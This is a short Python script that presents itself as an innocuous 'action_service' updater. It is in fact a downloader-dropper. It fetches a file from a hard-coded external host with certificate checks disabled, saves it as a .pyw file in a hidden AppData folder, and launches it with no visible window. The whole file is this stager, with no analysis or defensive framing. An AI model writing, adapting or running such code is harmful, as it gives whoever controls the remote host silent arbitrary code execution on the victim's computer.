import os
import urllib.request
import ssl
import subprocess
import pathlib as pl
import socket

class Waiter:
    APP_URL = "http://action.akirottv.de"
    APP_NAME = "action_service"
    FILE_NAME = "action.pyw"
    BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
    APP_DIR = os.path.join(BASE_DIR, APP_NAME)
    APP_PATH = os.path.join(APP_DIR, FILE_NAME)

    def __init__(self):
        pass
    
    def request_url(self) -> bool:
        print(f"Received URL: {self.APP_URL}")
        if self.APP_URL.startswith("http"):
            return True
        else:
            return False

    def download_and_install(self):
        os.makedirs(self.APP_DIR, exist_ok=True)
        try:
            print(f"→ Downloading...")
            context = ssl._create_unverified_context()
            req = urllib.request.Request(self.APP_URL)
            req.add_header("Pragma", "no-cache")
            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
                if getattr(resp, "status", 200) != 200:
                    print(f"Download failed – Status: {getattr(resp,'status', 'unknown')}")
                    exit(1)
                new_content = resp.read()

            with open(self.APP_PATH, "wb") as f:
                f.write(new_content)

            print(f"→ Successfully downloaded/updated")
            subprocess.run(['start', f'{self.APP_PATH}'], shell=True, cwd=self.APP_DIR, check=True, creationflags=subprocess.CREATE_NO_WINDOW) #type: ignore

        except Exception as e:
            print(f"{e}")

if __name__ == "__main__":
    self = Waiter()
    if self.request_url():
        self.download_and_install()